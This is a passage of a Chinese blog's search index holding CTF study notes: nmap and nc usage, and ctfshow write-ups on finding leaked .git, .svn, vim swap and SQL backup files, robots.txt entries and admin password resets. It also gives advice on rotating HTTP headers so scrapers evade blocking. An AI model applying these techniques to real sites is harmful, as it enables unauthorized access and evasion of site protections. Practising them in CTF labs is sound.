pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中用dig命令查询DNS记录</title>
      <link href="/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/"/>
      <url>/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h1><p><a href="https://www.sysgeek.cn/linux-dig/">dig命令</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Headers</title>
      <link href="/HTTP%20headers/"/>
      <url>/HTTP%20headers/</url>
      
        <content type="html"><![CDATA[<h1 id="最常见的HTTP-Headers"><a href="#最常见的HTTP-Headers" class="headerlink" title="最常见的HTTP Headers"></a>最常见的HTTP Headers</h1><ol><li>使用和优化HTTP Headers。这种方法会大大减少您的网络爬虫被各种数据源封锁的可能性，并确保检索到高质量的数据。</li><li>Header使客户端和服务器都能够在请求或响应中传输更多详细信息。<br><img src="https://s2.loli.net/2022/05/23/lvfEKmxSVF3QaNd.png"></li></ol><h2 id="HTTP-Header-User-Agent"><a href="#HTTP-Header-User-Agent" class="headerlink" title="HTTP Header User-Agent"></a>HTTP Header User-Agent</h2><ol><li>User-Agent Header传递的信息包括应用类型，操作系统，软件和版本信息，并允许数据目标来决定使用何种类型的HTML布局来响应，手机、平板电脑或PC均可显示不同的HTML布局。</li><li>网络服务器经常会验证User-Agent Header，这是网站服务器的第一重保障，这个步骤可以让数据源识别出可疑请求。例如，网络抓取时，大量请求传输到网络服务器，如果User-Agent Header相同，那么服务器端就会判定是爬虫行为。因此，有经验的网页抓取者会把User-Agent Header修改成不同的字符串，从而让服务器识别成是多个自然用户在发出请求。</li><li>因此，当涉及到User-Agent Header时，需要经常更改此Header的信息，这样就不容易因为这个Header而被封锁。</li></ol><h2 id="HTTP-Header-Accept-Language"><a href="#HTTP-Header-Accept-Language" class="headerlink" title="HTTP Header Accept-Language"></a>HTTP Header Accept-Language</h2><ol><li>Accept-Language Header向网络服务器传递的信息包含客户端有哪些语言，以及当网络服务器发回响应时首选哪种特定语言。</li><li>当网络服务器无法识别首选语言时，通常会使用特定Header。</li><li>也就是说，Accept-Language Header的关键是相关性。必须确保设置的语言符合数据目标域和客户端的IP位置。原因很简单，如果来自同一个客户端的请求内置有多种语言，网络服务器就会怀疑是爬虫行为，因此，网站就可能会阻止网络抓取过程。</li></ol><h2 id="HTTP-Header-Accept-Encoding"><a href="#HTTP-Header-Accept-Encoding" class="headerlink" title="HTTP Header Accept-Encoding"></a>HTTP Header Accept-Encoding</h2><ol><li>Accept-Encoding Header通知网络服务器在处理请求时使用哪种压缩算法。换句话说，当从网络服务器发送到客户端时，如果服务器可以处理，就会确认可以压缩的信息。</li><li>使用该Header优化后它可以节省流量，从流量负载的角度来看，这对客户端和网络服务器来说都比较好。客户端仍然会获得所需的信息，只是被压缩了。数据压缩后，网络服务器的流量小了，资源就节约下来了。</li></ol><h2 id="HTTP-Header-Accept"><a href="#HTTP-Header-Accept" class="headerlink" title="HTTP Header Accept"></a>HTTP Header Accept</h2><ol><li>Accept Header属于内容协商类别，其目的是通知网络服务器可以向客户端返回什么类型的数据格式。</li><li>听起来很简单，但是网络抓取最常犯的一个错误就是忽略或忘记根据网络服务器接受的格式来配置Header。如果Accept Header配置得当，就会让客户端和服务器之间的通信更加像真实用户行为，从而减少网络爬虫被封锁的可能性。</li></ol><h2 id="HTTP-Header-Referer"><a href="#HTTP-Header-Referer" class="headerlink" title="HTTP Header Referer"></a>HTTP Header Referer</h2><ol><li>在将请求发送到网络服务器之前，Referer Header会提供请求前用户所在的网页地址。</li><li>在网站试图阻止抓取过程时，Referer Header其实影响不大。一个随机的真实用户很可能上网时间间隔数小时。因此，如果您想网络抓取工具的流量看上去更加自然，只需在开始网络抓取会话之前指定一个随机网站。</li></ol><h1 id="HTTP-headers-数据类型"><a href="#HTTP-headers-数据类型" class="headerlink" title="HTTP headers 数据类型"></a>HTTP headers 数据类型</h1><ol><li>Accept：浏览器可接受的MIME类型。</li><li>Accept-Charset：浏览器可接受的字符集。</li><li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</li><li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</li><li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</li><li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。</li><li>Content-Length：表示请求消息正文的长度。</li><li>Cookie：这是最重要的请求头信息之一</li><li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</li><li>Host：初始URL中的主机和端口。</li><li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</li><li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</li><li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</li><li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</li><li>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</li><li>HTTP应答头概述（HttpServletResponse）</li><li>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，……等等许多其他任务。<br>设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。</li><li>HttpServletResponse还提供了许多设置</li><li>setContentType：设置Content-Type头。大多数Servlet都要用到这个方法。</li><li>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。</li><li>addCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。</li><li>HTTP应答头 说明</li><li>Allow 服务器支持哪些请求方法（如GET、POST等）。</li><li>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</li><li>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</li><li>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</li><li>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li><li>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</li><li>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</li><li>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</li><li>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=<a href="http://host/path&quot;)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82%E6%B3%A8%E6%84%8F%E8%BF%99%E7%A7%8D%E5%8A%9F%E8%83%BD%E9%80%9A%E5%B8%B8%E6%98%AF%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEHTML%E9%A1%B5%E9%9D%A2HEAD%E5%8C%BA%E7%9A%84">http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的</a><META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path">实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV=”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</li><li>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</li><li>Set-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</li><li>WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=&quot;executives&quot;“)。注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc命令</title>
      <link href="/nc%E5%91%BD%E4%BB%A4/"/>
      <url>/nc%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h1><h2 id="netcat的简写"><a href="#netcat的简写" class="headerlink" title="netcat的简写"></a>netcat的简写</h2><ol><li>nc是软连接到ncat<h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2></li><li>实现任意TCP/UDP端口侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li><li>端口的扫描（其它的博客推荐nmap，确实是）</li><li>机器之间传输文件</li><li>机器之间网络测速</li></ol><h1 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h1><ol><li>验证服务器端口是否通<br><img src="https://img-blog.csdnimg.cn/20210615163556344.png"></li><li>拷贝文件,首先在文件接受终端test2机器上激活nc监听，然后再文件发送终端test1机器上发送文件，test2上检查文件是否已经接受<br><img src=""></li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>ncat [options] [hostname] [port]<br><img src="https://s2.loli.net/2022/05/21/ahBkJyTRbjZfHFm.png"><br><img src="https://s2.loli.net/2022/05/21/ZeqnEW7c6bFDTjI.png"><br><img src="https://s2.loli.net/2022/05/21/g6Qu3w74rNoRevt.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国赛前训练题目</title>
      <link href="/%E5%9B%BD%E8%B5%9B%E5%89%8D%E8%AE%AD%E7%BB%83%E9%A2%98%E7%9B%AE/"/>
      <url>/%E5%9B%BD%E8%B5%9B%E5%89%8D%E8%AE%AD%E7%BB%83%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf神奇的二维码"><a href="#buuctf神奇的二维码" class="headerlink" title="buuctf神奇的二维码"></a>buuctf神奇的二维码</h1><ol><li>一个二维码，扫一下啥也没有</li><li>在放到010editor看头和尾和检查是否为exif隐写之后，binwalk分离出来了压缩包<br><img src="https://s2.loli.net/2022/05/21/hle1bIpEKm9PzB7.png"></li><li>里面有一个encode.txt编码文件<br><img src="https://s2.loli.net/2022/05/21/VFnBgsLtlZW52J4.png"></li><li>解码之后获得密码，打开了放flag的doc文件<br><img src="https://s2.loli.net/2022/05/21/jz1mJAOsChTuYeL.png"></li><li>发现flag.doc文件中是一个特别长的base64编码，使用basecrack破解<br><img src="https://s2.loli.net/2022/05/21/kmaJoR5WdUAHglS.png"></li><li>获得flag<br><a href="www.strongwill.top/basecrack工具使用">basecrack工具使用</a></li></ol><h1 id="buu-test-your-nc"><a href="#buu-test-your-nc" class="headerlink" title="buu test_your_nc"></a>buu test_your_nc</h1><p><a href="www.strongwill.top/nc命令">nc命令</a><br><img src="https://s2.loli.net/2022/05/21/8Jj69Obg3DzKQBn.png"></p><ol><li>直接nc加靶机号，连上之后ls看目录</li><li>发现flag，直接cat看一下就报flag</li></ol><h1 id="pwnthebox-pwnthebox"><a href="#pwnthebox-pwnthebox" class="headerlink" title="pwnthebox pwnthebox"></a>pwnthebox pwnthebox</h1><ol><li>信息搜集题目<br><img src="https://s2.loli.net/2022/05/23/vQ89c6gZWDVSndX.png"></li><li>在header中,抓个包<br><img src="https://s2.loli.net/2022/05/21/qB9zAWvCNQTr6UV.png"></li><li>在header中找到了flag</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basecrack工具使用</title>
      <link href="/basecrack/"/>
      <url>/basecrack/</url>
      
        <content type="html"><![CDATA[<h1 id="basecrack工具"><a href="#basecrack工具" class="headerlink" title="basecrack工具"></a>basecrack工具</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><pre class="line-numbers language-none"><code class="language-none">$ git clone https:&#x2F;&#x2F;github.com&#x2F;mufeedvh&#x2F;basecrack.git$ cd basecrack$ pip install -r requirements.txt$ python basecrack.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-none"><code class="language-none">对来自用户输入的单个Base编码数据进行解码：python basecrack.py对通过参数（-b&#x2F;--base）传递的单个Base编码数据进行解码：python basecrack.py -b SGVsbG8gV29ybGQh对通过文件（-f&#x2F;--file）传递的多个Base编码数据进行解码：python basecrack.py -f file.txt对任意模式的多重Base编码数据进行解码（-m&#x2F;--magic）：python basecrack.py --magic使用解码的Base数据生成字典文件并输出（-o&#x2F;--output）：python basecrack.py -f file.txt -o output-wordlist.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/nmap%E4%BD%BF%E7%94%A8/"/>
      <url>/nmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/343709343">https://zhuanlan.zhihu.com/p/343709343</a></li></ol><h2 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h2><ol><li>zenmap</li></ol><h2 id="分布式框架"><a href="#分布式框架" class="headerlink" title="分布式框架"></a>分布式框架</h2><ol><li>Dnamp</li></ol><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ol><h2 id="Nmap在实际中应用场合如下："><a href="#Nmap在实际中应用场合如下：" class="headerlink" title="Nmap在实际中应用场合如下："></a>Nmap在实际中应用场合如下：</h2><ol><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>端口扫描工具，即借助工具，试图了解所扫描IP提供的计算机网络服务类型（网络服务均与端口号相关），从而发现攻击弱点，常见服务对应端口号</li></ol><h2 id="Nmap进行完整全面的扫描"><a href="#Nmap进行完整全面的扫描" class="headerlink" title="Nmap进行完整全面的扫描"></a>Nmap进行完整全面的扫描</h2><pre class="line-numbers language-none"><code class="language-none">nmap –T4 –A –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ol><li>其中-A选项用于使用进攻性（Aggressive）方式扫描；</li><li>-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；</li><li>-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</li></ol><h4 id="最重要的是-T"><a href="#最重要的是-T" class="headerlink" title="最重要的是-T"></a>最重要的是-T</h4><ol><li>扫描速度过快，容易被系统拦截，导致访问一堆200，结果打开全是503，所以应避免扫描过快<br><img src="https://s2.loli.net/2022/05/18/jpYi1NqhPz392Qx.png"></li></ol><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p><img src="https://s2.loli.net/2022/05/18/bgHAlBP93FzDmIW.png"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描方式选项"><a href="#扫描方式选项" class="headerlink" title="扫描方式选项"></a>扫描方式选项</h3><p><img src="https://s2.loli.net/2022/05/18/Jek6ZarFWlzmBVU.png"></p><h3 id="端口参数和扫描顺序"><a href="#端口参数和扫描顺序" class="headerlink" title="端口参数和扫描顺序"></a>端口参数和扫描顺序</h3><p><img src="https://s2.loli.net/2022/05/18/4V8jf6sMhDFPK5T.png"></p><h3 id="版本侦测的用法"><a href="#版本侦测的用法" class="headerlink" title="版本侦测的用法"></a>版本侦测的用法</h3><p><img src="https://s2.loli.net/2022/05/18/eMa8ZJ2mXHYfCtE.png"></p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="用nmap扫描特定IP地址"><a href="#用nmap扫描特定IP地址" class="headerlink" title="用nmap扫描特定IP地址"></a>用nmap扫描特定IP地址</h3><p><img src="https://pic1.zhimg.com/80/v2-f9463447819bc6eddc02d61f57f26d30_720w.jpg"></p><h3 id="用-vv对结果进行详细输出"><a href="#用-vv对结果进行详细输出" class="headerlink" title="用-vv对结果进行详细输出"></a>用-vv对结果进行详细输出</h3><p><img src="https://pic2.zhimg.com/80/v2-b7f94720fc07861cda0f03a0eaaac8bd_720w.jpg"></p><h3 id="自行设置端口范围进行扫描"><a href="#自行设置端口范围进行扫描" class="headerlink" title="自行设置端口范围进行扫描"></a>自行设置端口范围进行扫描</h3><p><img src="https://pic1.zhimg.com/80/v2-70a54588925eb0a44e9d5ead03f55fbc_720w.jpg"></p><h3 id="指定端口号进行扫描"><a href="#指定端口号进行扫描" class="headerlink" title="指定端口号进行扫描"></a>指定端口号进行扫描</h3><p><img src="https://pic2.zhimg.com/80/v2-416f2b4c051b5f2bd62cbe48d3101f41_720w.jpg"></p><h3 id="对端口进行ping扫描"><a href="#对端口进行ping扫描" class="headerlink" title="对端口进行ping扫描"></a>对端口进行ping扫描</h3><p><img src="https://pic3.zhimg.com/80/v2-ef3ef08d4f7b120d170f9b0a95130b7a_720w.jpg"></p><h3 id="路由跟踪"><a href="#路由跟踪" class="headerlink" title="路由跟踪"></a>路由跟踪</h3><p><img src="https://pic1.zhimg.com/80/v2-24910deb4da23cdf158ee3dd15b98170_720w.jpg"></p><h3 id="扫描一个段的主机在线情况"><a href="#扫描一个段的主机在线情况" class="headerlink" title="扫描一个段的主机在线情况"></a>扫描一个段的主机在线情况</h3><p><img src="https://pic2.zhimg.com/80/v2-3849b8e75d023539fd93923ea7aa2bd9_720w.jpg"></p><h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><p><img src="https://pic4.zhimg.com/80/v2-4e9d4f7f27b827fbc4d976fd96511d93_720w.png"></p><h3 id="万能开关扫描"><a href="#万能开关扫描" class="headerlink" title="万能开关扫描"></a>万能开关扫描</h3><p><img src="https://pic3.zhimg.com/80/v2-fc195a646aa1353f8b71342ec6a67b26_720w.jpg"></p><h3 id="SYN-FIN-ACK等其它扫描方式"><a href="#SYN-FIN-ACK等其它扫描方式" class="headerlink" title="SYN,FIN,ACK等其它扫描方式"></a>SYN,FIN,ACK等其它扫描方式</h3><p><img src="https://s2.loli.net/2022/05/18/NpMt7T9Qv2dhK6P.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow信息搜集</title>
      <link href="/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><ol><li>开发注释未能及时删除</li><li>打开ctrl + u查看源代码即可获得flag</li></ol><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><ol><li>有的浏览器直接打开查看源代码就能看到flag</li><li>这个题的标准思路是：使用view-source协议，edge不支持，firefox和chrome支持。</li><li>当网站不让你看源码（js过滤了源码），可以在地址栏的url前加上’view-source:’前缀查看<br><img src="https://s2.loli.net/2022/05/18/k4UizITfxOc7S1u.png"></li></ol><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><ol><li><p>用御剑和dirsearch扫了一遍，被拦了</p></li><li><p>没思路的时候burp抓个包看看，有意外收获，flag在响应的数据包里面<br><img src="https://s2.loli.net/2022/05/18/ez4SxcJiY1U7VXj.png"></p></li></ol><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><ol><li>题目提示：总有人把后台地址写入robots,知道是robots.txt协议，写后缀robots.txt，发现过滤了所有用户的/flagishere.txt<br><a href="http://www.strongwill.top/robot%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/">robots协议</a><br><img src="https://s2.loli.net/2022/05/18/JWf5Dtjl24aimyw.png"></li><li>直觉告诉我们，被过滤的是flag，打开后真的发现了flag<br><img src="https://s2.loli.net/2022/05/18/YXu6hvxZTpa9knM.png"></li></ol><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><ol><li>phps源码泄露问题</li><li>直接访问index.phps,获得flag<br><img src="https://s2.loli.net/2022/05/18/4CSF3kr52x9yin6.png"></li><li>访问后自动下载一个index.phps文件，打开后发现flag<br><img src="https://s2.loli.net/2022/05/18/w3CcsoZLUgGtzvm.png"></li></ol><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><ol><li>考察git代码泄露，直接访问url/.git/index.php</li><li>git源码泄露一般在根目录下/.git/文件夹下找<br><img src="https://s2.loli.net/2022/05/18/TIRAXNm3fVMi1l7.png"></li></ol><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><ol><li>考察信息svn泄露，直接访问url/.svn/<br><img src="https://s2.loli.net/2022/05/18/YWCx8S9noqcURHu.png"></li></ol><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><ol><li>考察vim临时文件泄露<h3 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h3></li><li>vim编辑器在编辑时会生成一个隐藏的临时文件</li><li>当vim非正常关闭时，这个文件就会被保存下来</li><li>一般会保存在url/编辑的文件.swp下</li></ol><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><ol><li>cookie泄露</li><li>打开burp抓包，获得cookie是flag<br><img src="https://s2.loli.net/2022/05/21/qB9zAWvCNQTr6UV.png"></li></ol><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><h3 id="关于如何进一个网站的后台，是不是直接加-admin"><a href="#关于如何进一个网站的后台，是不是直接加-admin" class="headerlink" title="关于如何进一个网站的后台，是不是直接加/admin"></a>关于如何进一个网站的后台，是不是直接加/admin</h3><ol><li>每个网站的后台进入方式是不一样的，在域名后面加/Admin只是个别网站开发者开发时把网站的后台登录页面名称设为Admin而已，并不是所有网站加/Admin都可以进入，具体地址完全取决于开发者开发时的设置。</li><li>比如一个网站在开发时，开发者命名了一个Admin的文件夹，里面有个页面命名为admin.html，那么网站后台访问方式就是：域名/Admin/admin.html，那如果文件夹名是Web，网站后台访问方式就是：域名/Web/admin.html，一般都需要账户密码才能进入。</li><li>进后台其实就是找一个admin.html的用户登录页面</li></ol><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><ol><li>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</li><li>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</li><li><img src="https://s2.loli.net/2022/05/24/59ErSO8v4HMezNP.png"></li><li><img src="https://s2.loli.net/2022/05/24/f5qui3E9nwJgV4S.png"></li></ol><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><ol><li>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</li><li>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问</li><li>因为index.php是flag.txt的上层，所以要在index的后面拼接nothinghere/fl000g.txt</li><li><img src="https://s2.loli.net/2022/05/24/D43yPnkXagcO1Tv.png"></li><li><img src="https://s2.loli.net/2022/05/24/Zwst9CYkJQ2ITug.png"></li><li><img src="https://s2.loli.net/2022/05/24/MvK6SwFcugr2LVh.png"></li></ol><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><ol><li>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</li><li>访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag<br><img src="https://s2.loli.net/2022/05/24/9FOYdBeKgm42G5q.png"></li><li><img src="https://s2.loli.net/2022/05/24/rlpJxPkLsod3Zyh.png"></li><li><img src="https://s2.loli.net/2022/05/24/Llc1ow74aRQEHMe.png"></li><li><img src="https://s2.loli.net/2022/05/24/akdnC17jB8gOtDZ.png"></li></ol><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><ol><li>备份的sql文件会泄露敏感信息</li><li>backup.sql</li><li><img src="https://s2.loli.net/2022/05/25/25pnmiGIM8y1stl.png"></li></ol><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><ol><li>不要着急，休息，休息一会儿，玩101分给你flag</li><li>网页游戏一定要查看js文件，js文件控制行为，行为一般就是获得多少分能够通关</li><li>查看js文件，查看flag的条件，去通过uncode解码。 访问110.php</li><li><img src="https://s2.loli.net/2022/05/25/FYb7OIqgQSwrGZU.png"></li><li><img src="https://s2.loli.net/2022/05/25/ZK5uDdkOyaALP8j.png"></li><li><img src="https://s2.loli.net/2022/05/25/kPmgXouc2RjGYMi.png"></li><li>解码，判断谐音，url后面加/110.php</li></ol><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><ol><li>密钥什么的，就不要放在前端了</li><li>打开源代码查看到注释中有u和p的提示<br><img src="https://s2.loli.net/2022/05/25/n4N58uXUjdxJBZL.png"></li><li>$_POST传参username和pazzword</li><li><img 